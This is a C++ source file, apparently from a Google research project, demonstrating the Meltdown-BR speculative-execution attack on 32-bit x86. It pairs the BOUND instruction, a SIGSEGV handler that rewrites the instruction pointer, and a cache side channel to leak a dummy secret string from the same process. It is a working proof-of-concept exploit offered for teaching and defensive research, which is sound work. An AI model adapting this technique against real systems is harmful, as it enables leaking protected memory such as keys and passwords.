/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Meltdown-BR demonstrates speculation over the "bound" instruction on x86.
 * That instruction is allowed only in 32-bit mode, so the example cannot work
 * on 64-bits. We check with the "bound" instruction whether a given offset
 * belongs to the public_data string. In the case of safe offset it passes,
 * when the offset points to the private_data, the bounds check fails and
 * SIGSEGV is triggered. However, the speculative execution continues past the
 * bounds check.
 **/

#if !defined(__linux__) && !defined(__APPLE__)
#  error Unsupported OS. Linux or MacOS required.
#endif

#ifndef __i386__
#  error Unsupported architecture. 32-bit x86 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// ICC requires the offset variable to be volatile. If it isn't, ICC schedules
// to spill it to stack after the second ForceRead call and that never happens
// because of the SIGSEGV and architectural jumping over that section.
// In the next loop the restore from stack spill just loads some random value
// from the stack that was not rewritten.
static char leak_byte(const char *data, volatile size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(data);
    sidechannel.FlushOracle();

    // Checks bounds and accesses the safe offset. That succeeds.
    BoundsCheck(data, safe_offset);
    ForceRead(isolated_oracle.data() +
              static_cast<unsigned char>(data[safe_offset]));

    // Check bounds of the offset to private data. The check fails, but the
    // speculative execution continues.
    BoundsCheck(data, offset);
    ForceRead(isolated_oracle.data() +
              static_cast<unsigned char>(data[offset]));

    // Unreachable code.
    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGSEGV signal handler moves the instruction pointer to this label.
#ifdef __linux__
    asm volatile("afterspeculation:");
#elif defined(__APPLE__)
    asm volatile("_afterspeculation:");
#else
#  error Unsupported OS.
#endif

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigsegv(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGSEGV signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
#ifdef __linux__
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#elif defined(__APPLE__)
  ucontext->uc_mcontext->__ss.__eip =
      reinterpret_cast<uintptr_t>(afterspeculation);
#else
#  error Unsupported OS.
#endif
}

static void set_signal() {
  struct sigaction act;
  memset(&act, 0, sizeof(struct sigaction));
  act.sa_sigaction = sigsegv;
  act.sa_flags = SA_SIGINFO;
#ifdef __linux__
  sigaction(SIGSEGV, &act, nullptr);
#elif defined(__APPLE__)
  sigaction(SIGTRAP, &act, nullptr);
#else
#  error Unsupported OS.
#endif
}

int main() {
  set_signal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
  return 0;
}
